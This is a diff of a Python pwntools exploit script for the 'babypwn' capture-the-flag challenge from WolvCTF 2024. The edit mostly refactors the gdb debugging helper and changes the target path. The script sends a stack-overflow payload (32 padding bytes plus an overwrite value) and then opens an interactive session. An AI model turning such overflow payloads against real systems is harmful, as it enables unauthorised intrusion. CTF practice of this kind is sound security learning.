@@ -11,19 +11,21 @@ context.update(
 )
 
 REMOTE = False
-TARGET = './babypwn'
+TARGET = os.path.realpath('/ctf-writeups/WolvCTF 2024/pwn/babypwn/babypwn')
 elf = ELF(TARGET)
 
 def attach(r):
-    if not REMOTE:
-        bkps = []
-        cmds = []
-        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
-    return
+    if REMOTE:
+        return
+
+    bkps = []
+    cmds = []
+
+    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
 
 def exploit(r):
     attach(r)
-    
+
     r.sendlineafter(b'What\'s your name?\n', b'A' * 32 + p32(0x41414141))
     r.interactive()
     return
@@ -35,6 +37,6 @@ if __name__ == '__main__':
     else:
         REMOTE = False
         r = process([TARGET,])
-        
+
     exploit(r)
     exit(0)
